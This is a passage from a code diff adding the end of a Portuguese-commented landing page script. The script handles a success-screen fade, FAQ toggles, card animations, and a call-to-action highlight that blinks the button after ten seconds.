+                    successScreen.style.display = 'none';
+                }, 800);
+            }, 3000);
+        });
+
+        // FAQ Toggle
+        function toggleFaq(element) {
+            const answer = element.nextElementSibling;
+            const isActive = answer.classList.contains('active');
+            
+            // Fechar todas as outras FAQs
+            document.querySelectorAll('.faq-answer').forEach(item => {
+                item.classList.remove('active');
+            });
+            document.querySelectorAll('.faq-question').forEach(item => {
+                item.classList.remove('active');
+            });
+            
+            // Abrir/fechar a FAQ clicada
+            if (!isActive) {
+                answer.classList.add('active');
+                element.classList.add('active');
+            }
+        }
+
+        // Prevenir clique durante o fade-out
+        document.addEventListener('click', function(e) {
+            const successScreen = document.getElementById('successScreen');
+            if (successScreen && !successScreen.classList.contains('fade-out')) {
+                e.preventDefault();
+            }
+        });
+
+        // Animação suave ao rolar
+        window.addEventListener('scroll', function() {
+            const cards = document.querySelectorAll('.card');
+            cards.forEach(card => {
+                const rect = card.getBoundingClientRect();
+                if (rect.top < window.innerHeight && rect.bottom > 0) {
+                    card.style.opacity = '1';
+                    card.style.transform = 'translateY(0)';
+                }
+            });
+        });
+
+        // Inicializar animações e efeitos
+        document.addEventListener('DOMContentLoaded', function() {
+            // Animação escalonada dos cards
+            const cards = document.querySelectorAll('.card');
+            cards.forEach((card, index) => {
+                setTimeout(() => {
+                    card.style.opacity = '1';
+                    card.style.transform = 'translateY(0)';
+                }, index * 150);
+            });
+
+            // Efeito de hover nos cards
+            cards.forEach(card => {
+                card.addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-5px)';
+                });
+                
+                card.addEventListener('mouseleave', function() {
+                    this.style.transform = 'translateY(0)';
+                });
+            });
+        });
+
+        // Scroll suave para o CTA quando necessário
+        function scrollToCTA() {
+            document.querySelector('.cta-section').scrollIntoView({
+                behavior: 'smooth',
+                block: 'center'
+            });
+        }
+
+        // Destacar CTA após tempo na página
+        setTimeout(() => {
+            const ctaSection = document.querySelector('.cta-section');
+            ctaSection.style.background = 'linear-gradient(135deg, #fff3e0, #ffe0b2)';
+            ctaSection.style.border = '2px solid #3483fa';
+            
+            // Piscar o botão
+            const button = document.querySelector('.cta-button');
+            let blinkCount = 0;
+            const blinkInterval = setInterval(() => {
+                button.style.opacity = button.style.opacity === '0.7' ? '1' : '0.7';
+                blinkCount++;
+                if (blinkCount >= 6) {
+                    clearInterval(blinkInterval);
+                    button.style.opacity = '1';
+                }
+            }, 300);
+        }, 10000);
+    </script>
+
+</div></body></html>
